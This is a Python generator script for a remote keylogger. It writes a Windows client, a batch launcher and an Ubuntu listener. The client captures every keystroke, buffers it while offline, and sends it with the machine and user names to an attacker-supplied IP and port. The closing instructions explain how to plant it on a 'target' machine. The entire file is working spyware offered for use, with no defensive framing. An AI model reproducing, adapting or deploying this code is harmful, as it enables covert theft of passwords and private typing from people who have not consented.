#!/usr/bin/env python3
# remote_keylogger_standalone.py - Creates a standalone Windows keylogger that connects back to Ubuntu
import argparse
import os

# Generate a Windows executable keylogger that sends keystrokes back to the attacker machine
def generate_keylogger(attacker_ip, attacker_port):
    # Create the Python keylogger code that will run on the Windows target
    keylogger_code = f'''
import keyboard
import socket
import threading
import time
import os
import sys

# Configuration
ATTACKER_IP = "{attacker_ip}"
ATTACKER_PORT = {attacker_port}
RECONNECT_DELAY = 5  # seconds between reconnection attempts

# Buffer to store keystrokes when connection is lost
keystroke_buffer = ""
connection_active = False

# Function to handle keyboard events
def on_key_press(event):
    global keystroke_buffer, connection_active
    
    # Format the keystroke
    key = event.name
    if len(key) > 1:
        if key == "space":
            key = " "
        elif key == "enter":
            key = "\\n"
        elif key == "decimal":
            key = "."
        else:
            key = f"[{{key.upper()}}]"
    
    # Add to buffer if not connected, otherwise send immediately
    if connection_active:
        try:
            sock.send(key.encode())
        except:
            connection_active = False
            keystroke_buffer += key
    else:
        keystroke_buffer += key

# Function to maintain connection to attacker
def maintain_connection():
    global sock, connection_active, keystroke_buffer
    
    while True:
        if not connection_active:
            try:
                # Create new socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ATTACKER_IP, ATTACKER_PORT))
                connection_active = True
                
                # Send computer info for identification
                info = f"[SYSTEM INFO] {{os.environ.get('COMPUTERNAME', 'Unknown')}} - {{os.environ.get('USERNAME', 'Unknown')}}\\n"
                sock.send(info.encode())
                
                # Send any buffered keystrokes
                if keystroke_buffer:
                    sock.send(keystroke_buffer.encode())
                    keystroke_buffer = ""
                    
            except Exception as e:
                connection_active = False
                time.sleep(RECONNECT_DELAY)
        else:
            # Keep the connection alive
            time.sleep(10)
            try:
                # Send heartbeat
                sock.send("[HEARTBEAT]".encode())
            except:
                connection_active = False

# Set up keyboard listener
keyboard.on_release(on_key_press)

# Start connection handling thread
connection_thread = threading.Thread(target=maintain_connection, daemon=True)
connection_thread.start()

# Keep the program running
keyboard.wait()
'''

    # Write the Python script to a file
    with open('windows_keylogger.py', 'w') as f:
        f.write(keylogger_code)
    
    print(f"[+] Keylogger Python script created: windows_keylogger.py")
    
    # Create a batch file to run the keylogger
    batch_script = '''@echo off
pip install keyboard
python windows_keylogger.py
'''
    
    with open('run_keylogger.bat', 'w') as f:
        f.write(batch_script)
    
    print(f"[+] Batch launcher created: run_keylogger.bat")
    
    # Create a listener script for the Ubuntu machine
    listener_script = f'''#!/usr/bin/env python3
import socket
import threading
import datetime

def handle_client(client_socket, address):
    print(f"[*] Connection from {{address}}")
    
    # Create a log file for this connection
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    logfile = f"keylog_{{address[0]}}_{{timestamp}}.txt"
    
    with open(logfile, "w") as f:
        f.write(f"Keylogger connection from {{address}} at {{datetime.datetime.now()}}\\n\\n")
    
    # Continuously receive data
    try:
        while True:
            data = client_socket.recv(4096)
            if not data:
                break
                
            # Decode and process the received data
            decoded = data.decode('utf-8', errors='replace')
            
            # Write to log file
            with open(logfile, "a") as f:
                f.write(decoded)
            
            # Print to console (except heartbeats)
            if "[HEARTBEAT]" not in decoded:
                print(decoded, end='', flush=True)
                
    except Exception as e:
        print(f"[!] Error with {{address}}: {{e}}")
    finally:
        print(f"[!] Connection closed: {{address}}")
        client_socket.close()

def start_listener(port):
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        listener.bind(("0.0.0.0", port))
        listener.listen(5)
        print(f"[*] Listening on port {{port}}...")
        
        while True:
            client, address = listener.accept()
            client_handler = threading.Thread(target=handle_client, args=(client, address))
            client_handler.start()
            
    except Exception as e:
        print(f"[!] Error: {{e}}")
        listener.close()

if __name__ == "__main__":
    try:
        start_listener({attacker_port})
    except KeyboardInterrupt:
        print("\\n[!] Shutting down...")
'''
    
    with open('ubuntu_listener.py', 'w') as f:
        f.write(listener_script)
    
    print(f"[+] Listener script created: ubuntu_listener.py")
    print(f"[+] Make the listener executable with: chmod +x ubuntu_listener.py")
    
    print("\n[*] Instructions:")
    print("1. Start the listener on your Ubuntu machine with: ./ubuntu_listener.py")
    print("2. Transfer windows_keylogger.py and run_keylogger.bat to the target Windows machine")
    print("3. Run the batch file on the Windows machine to start the keylogger")
    print("4. Keystrokes will be sent back to your listener")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate a standalone keylogger that connects back to an attacker machine")
    parser.add_argument("attacker_ip", help="IP address of the attacking machine (Ubuntu)")
    parser.add_argument("--port", type=int, default=4444, help="Port to listen on (default: 4444)")
    
    args = parser.parse_args()
    
    generate_keylogger(args.attacker_ip, args.port)
